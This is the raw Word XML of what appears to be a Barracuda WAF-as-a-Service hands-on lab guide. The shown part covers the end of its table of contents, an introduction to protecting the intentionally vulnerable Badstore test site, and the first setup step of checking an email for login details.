            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Adding an Exception for a simple False Positive</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="000C08D8" w:rsidRPr="000C08D8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r w:rsidR="000C08D8" w:rsidRPr="000C08D8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0DDCC571" w14:textId="3D4766BD" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791977" w:history="1">
        <w:r w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Confirming Credit Card PII Leakage Vulnerabilities</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="000C08D8" w:rsidRPr="000C08D8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:t>21</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="50A2BA95" w14:textId="37F6F678" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791978" w:history="1">
        <w:r w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Blocking PII Leakage</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="000C08D8" w:rsidRPr="000C08D8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:t>22</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0FEC0464" w14:textId="308C6CE1" w:rsidR="000C08D8" w:rsidRPr="000C08D8" w:rsidRDefault="000C08D8" w:rsidP="000C08D8">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791980" w:history="1">
        <w:r w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Adding an Exception for a False Positive in File Uploads</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="000C08D8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:t>25</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6AEB075D" w14:textId="0F138389" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791985" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>API Protection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_Toc72791985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26</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="55867631" w14:textId="1230A43C" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791986" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Browse to your Backend Server</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_Toc72791986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27</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="227115F0" w14:textId="6E9078F6" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791987" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Add your API Application to WAF-as-a-Service</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_Toc72791987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28</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="67634D62" w14:textId="488C843C" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791988" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Test your WAF-as-a-Service API Application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_Toc72791988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29</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="679CA774" w14:textId="66DC1C49" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791989" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Importing the OpenAPI Definition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_Toc72791989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31</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7FD0FAD5" w14:textId="24CF893C" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791990" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>API Method Protection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_Toc72791990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32</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0F33BA96" w14:textId="5EAD4A4A" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791991" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>API JSON Key Protection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_Toc72791991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34</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4E89D40C" w14:textId="1C568DA8" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791992" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>API Rate Limit Protection</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_Toc72791992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3</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>6</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1898BC1C" w14:textId="18B1CD96" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791993" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Finishing Up</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_Toc72791993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37</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3675394B" w14:textId="4B8826D9" w:rsidR="00F46E0E" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc72791994" w:history="1">
        <w:r w:rsidR="00F46E0E" w:rsidRPr="00422614">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>THE END</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc72791994 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>38</w:t>
        </w:r>
        <w:r w:rsidR="00F46E0E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1B7F291E" w14:textId="4A23B1C9" w:rsidR="55E0BB2E" w:rsidRDefault="55E0BB2E" w:rsidP="005272B9">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2681A6AE" w14:textId="31578866" w:rsidR="55E0BB2E" w:rsidRDefault="55E0BB2E" w:rsidP="00172641">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F8002F" w14:textId="4F1C9B8A" w:rsidR="004B6A8F" w:rsidRPr="005320D4" w:rsidRDefault="7C1C15DA" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc762409983"/>
      <w:bookmarkStart w:id="1" w:name="_Toc72791960"/>
      <w:r w:rsidRPr="005320D4">
        <w:lastRenderedPageBreak/>
        <w:t>Introduction</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="5E0D3C78" w14:textId="4257D8E8" w:rsidR="004B6A8F" w:rsidRDefault="004B6A8F" w:rsidP="00172641">
      <w:r w:rsidRPr="00172641">
        <w:t xml:space="preserve">In this </w:t>
      </w:r>
      <w:r w:rsidR="7BE876DA" w:rsidRPr="00172641">
        <w:t xml:space="preserve">Test Drive, </w:t>
      </w:r>
      <w:r w:rsidRPr="00172641">
        <w:t xml:space="preserve">you will </w:t>
      </w:r>
      <w:r w:rsidR="00D37BE2">
        <w:t xml:space="preserve">learn how to </w:t>
      </w:r>
      <w:r w:rsidR="17F1C401" w:rsidRPr="00172641">
        <w:t>deploy Barracuda WAF-as-a-Service</w:t>
      </w:r>
      <w:r w:rsidR="3462B978" w:rsidRPr="00172641">
        <w:t xml:space="preserve"> to protect a test site by completing a series of lessons.  </w:t>
      </w:r>
      <w:r w:rsidR="3BC37B06" w:rsidRPr="00172641">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="3462B978" w:rsidRPr="00172641">
        <w:t>Each lesson will start with an introduction or a scenario</w:t>
      </w:r>
      <w:r w:rsidR="00D37BE2">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E4EFC4" w14:textId="3F2923E8" w:rsidR="006D4D26" w:rsidRPr="006D4D26" w:rsidRDefault="006D4D26" w:rsidP="006D4D26">
      <w:r w:rsidRPr="006D4D26">
        <w:t>Barracuda WAF-as-a-Service provides cloud-delivered, enterprise-grade application security without the administrative overhead of an appliance</w:t>
      </w:r>
      <w:r w:rsidR="00CD36A0">
        <w:t>. Y</w:t>
      </w:r>
      <w:r w:rsidRPr="006D4D26">
        <w:t xml:space="preserve">ou can secure your applications within minutes, regardless of where they are hosted. There is </w:t>
      </w:r>
      <w:r w:rsidR="00CD36A0">
        <w:t>no infrastructure</w:t>
      </w:r>
      <w:r w:rsidRPr="006D4D26">
        <w:t xml:space="preserve"> to deploy, scale, size, or maintain.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="102838EC" w14:textId="601D8A19" w:rsidR="2A0DDA62" w:rsidRPr="00172641" w:rsidRDefault="2A0DDA62" w:rsidP="00172641">
      <w:r w:rsidRPr="00172641">
        <w:t xml:space="preserve">To learn more about </w:t>
      </w:r>
      <w:r w:rsidR="4DEA9A18" w:rsidRPr="00172641">
        <w:t>WAF-as-a-Service</w:t>
      </w:r>
      <w:r w:rsidR="1B0D7619" w:rsidRPr="00172641">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="232808E6" w:rsidRPr="00172641">
        <w:t xml:space="preserve">visit </w:t>
      </w:r>
      <w:r w:rsidR="1B0D7619" w:rsidRPr="00172641">
        <w:t>the landing page</w:t>
      </w:r>
      <w:r w:rsidR="04640DA4" w:rsidRPr="00172641">
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="00CD36A0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51428DC4" w14:textId="2E970030" w:rsidR="1B0D7619" w:rsidRDefault="1B0D7619" w:rsidP="00172641">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="SimSun" w:hAnsi="Cambria" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId12">
        <w:r w:rsidRPr="55E0BB2E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>https://www.barracuda.com/waf-as-a-service</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="70CC4281" w14:textId="00FD1913" w:rsidR="486724F5" w:rsidRDefault="486724F5" w:rsidP="00172641">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="SimSun" w:hAnsi="Cambria" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidR="421B83E0" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">main </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>WAF-as-a-Service documentation can be found here</w:t>
      </w:r>
      <w:r w:rsidR="2E1DEF86" w:rsidRPr="55E0BB2E">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2324E749" w14:textId="319C291F" w:rsidR="61047734" w:rsidRDefault="002D2B05" w:rsidP="00172641">
      <w:hyperlink r:id="rId13">
        <w:r w:rsidR="61047734" w:rsidRPr="55E0BB2E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://</w:t>
        </w:r>
        <w:r w:rsidR="486724F5" w:rsidRPr="55E0BB2E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>campus.barracuda.com/product/WAAS/doc/77399164/getting-starte</w:t>
        </w:r>
        <w:r w:rsidR="70E8CB7F" w:rsidRPr="55E0BB2E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>d</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7BA4213D" w14:textId="31F1B498" w:rsidR="32F6121D" w:rsidRDefault="34E6EB9A" w:rsidP="00172641">
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">The test site </w:t>
      </w:r>
      <w:r w:rsidR="3555B444" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">you will be using </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>is a</w:t>
      </w:r>
      <w:r w:rsidR="005B6803">
        <w:t xml:space="preserve"> web</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> application </w:t>
      </w:r>
      <w:r w:rsidR="008C7CF8">
        <w:t xml:space="preserve">called </w:t>
      </w:r>
      <w:commentRangeStart w:id="2"/>
      <w:commentRangeStart w:id="3"/>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="6818665A" w:rsidRPr="55E0BB2E">
        <w:t>Badstore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0AAD7C2F" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
      <w:commentRangeEnd w:id="2"/>
      <w:r w:rsidR="32F6121D">
        <w:commentReference w:id="2"/>
      </w:r>
      <w:commentRangeEnd w:id="3"/>
      <w:r w:rsidR="32F6121D">
        <w:commentReference w:id="3"/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="709207CD" w:rsidRPr="55E0BB2E">
        <w:t>Badstore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="709207CD" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> is an intentionally vulnerable application created by Barracuda Networks in 2004 and contributed to the OWASP Vulnerable Applications project.</w:t>
      </w:r>
      <w:r w:rsidR="76AC5603" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="18133DD9" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">This site </w:t>
      </w:r>
      <w:r w:rsidR="709207CD" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">uses </w:t>
      </w:r>
      <w:r w:rsidR="008C2437" w:rsidRPr="55E0BB2E">
        <w:t>JavaScript</w:t>
      </w:r>
      <w:r w:rsidR="709207CD" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="709207CD" w:rsidRPr="55E0BB2E">
        <w:t>MySql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="709207CD" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="576D8596" w:rsidRPr="55E0BB2E">
        <w:t>technologies and</w:t>
      </w:r>
      <w:r w:rsidR="709207CD" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007520A7">
        <w:t>is on port 80</w:t>
      </w:r>
      <w:r w:rsidR="008C7CF8">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9CE9C1" w14:textId="2FAFE871" w:rsidR="543DCEBE" w:rsidRPr="00CD36A0" w:rsidRDefault="7E3F3A78" w:rsidP="00956757">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc1267932696"/>
      <w:bookmarkStart w:id="5" w:name="_Toc72791961"/>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>Check your email for important information</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w14:paraId="2D8EFD96" w14:textId="1EBE11A1" w:rsidR="543DCEBE" w:rsidRDefault="7E3F3A78" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>As part of the Test Drive, you have received</w:t>
      </w:r>
      <w:r w:rsidR="4A434D9C" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="4D684BE3" w:rsidRPr="55E0BB2E">
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">n email </w:t>
      </w:r>
      <w:r w:rsidR="7CB282C5" w:rsidRPr="55E0BB2E">
        <w:t>from Microsoft Azure Marketplace Team</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECBFF72" w14:textId="0CCC4D33" w:rsidR="543DCEBE" w:rsidRDefault="3D7620D4" w:rsidP="00EB683C">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5E415EEA" wp14:editId="395CB941">
            <wp:extent cx="1466850" cy="1842965"/>
            <wp:effectExtent l="0" t="0" r="0" b="5080"/>
            <wp:docPr id="1964248946" name="Picture 1964248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2489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6850" cy="1842965"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C40CEF1" w14:textId="2CAA5F8D" w:rsidR="543DCEBE" w:rsidRDefault="00A52D43" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>The</w:t>
      </w:r>
      <w:r w:rsidR="005B6803">
        <w:t xml:space="preserve"> following are </w:t>
      </w:r>
      <w:r>
        <w:t>the</w:t>
      </w:r>
      <w:r w:rsidR="7E3F3A78">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005B6803">
        <w:t xml:space="preserve">key items of </w:t>
      </w:r>
      <w:r w:rsidR="7E3F3A78">
        <w:t>information you will need</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> from the email:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="708C7C8F" w14:textId="7AD24589" w:rsidR="543DCEBE" w:rsidRDefault="7E3F3A78" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Login URL</w:t>
      </w:r>
    </w:p>
